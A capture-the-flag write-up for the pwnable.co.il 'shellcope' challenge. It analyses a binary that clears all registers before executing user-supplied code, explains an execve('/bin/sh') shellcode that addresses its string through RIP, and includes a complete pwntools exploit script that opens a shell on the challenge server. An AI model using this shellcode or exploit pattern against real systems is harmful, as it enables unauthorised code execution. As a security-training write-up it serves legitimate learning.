---
title: "pwnable.co.il - shellcope"
classes: wide
header:
  teaser: /assets/images/ctf-writeups/pwnable.co.il/logo.png
ribbon: green
description: "Shellcode customize challenge."
categories:
  - CTF Writeups
  - pwn
---

> Challenge description:
>
> I just learned how to write shellcode!
> But i'm not sure where to store things if i don't have a stack... 

### Protections:
<pre>    
    Arch:       amd64-64-little
    RELRO:      <font color="#49FF6D">Full RELRO</font>
    Stack:      <font color="#FF3C3C">No canary found</font>
    NX:         <font color="#49FF6D">NX enabled</font>
    PIE:        <font color="#49FF6D">PIE enabled</font>
    SHSTK:      <font color="#49FF6D">Enabled</font>
    IBT:        <font color="#49FF6D">Enabled</font>
    Stripped:   <font color="#FF3C3C">No</font>
</pre>

Dump of the decompiled main function:
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *dest; // [rsp+8h] [rbp-8h]

  dest = (char *)mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);
  strcpy(dest, reset_shellcodes);
  fgets(dest + 48, 4047, stdin);
  mprotect(dest, 0x1000uLL, 5);
  ((void (*)(void))dest)();
  return 0;
}
```

`reset_shellcodes` points to a sequence of opcodes stored in the `.data` section, the main function maps a 0x1000 bytes (page size - 4096 in decimal) using `mmap()`, copies the predefined opcodes from `reset_shellcodes` into that page using `strcpy()`, 
then reads up to `4047` bytes from `stdin` into the page starting at offset 48 (appending the user provided instructions). 
It then calls `mprotect()` to set the page permissions to `read + execute` and finally jumps to the mapped page to run the combined shellcodes.


[![static symbols](/assets/images/ctf-writeups/pwnable.co.il/shellcope/reset_shellcodes_dump.png)](/assets/images/ctf-writeups/pwnable.co.il/shellcope/reset_shellcodes_dump.png)

This code clears all the registers, including the stack registers `RBP` and `RSP`. 
That makes implementing a `shell-spawning` shellcode harder, because we cant use the stack to hold the string `"/bin/sh"`.

One way around this is to embed the `"/bin/sh"` string inside the shellcode itself and use the `RIP` register (which isnt cleared by the XOR) as a pointer to that string.

### Non-stack based shellcode
```asm
jmp code

shell:
    .ascii "/bin/sh\\x00"     

code:         
    lea rdi, [rip+shell]     
    mov al, 0x3b             
    syscall  
```

This shellcode loads the address of `"/bin/sh"` into `RDI`, sets `AL` to `0x3b` (the execve syscall), and then makes the syscall.

## Exploit
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './shellcope')

### config ###
host = args.HOST or 'pwnable.co.il'
port = int(args.PORT or 9001)

### defines ###
shellcode = """
jmp code

shell:
    .ascii "/bin/sh\\x00"     

code:
    lea rdi, [rip+shell]     
    mov al, 0x3b             
    syscall               
"""

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --
def main():
    ### run ###
    io = start()
    
    log.info("sending shellcode...")
    io.sendline(asm(shellcode))

    io.interactive()

if __name__ == "__main__":
    main()
```
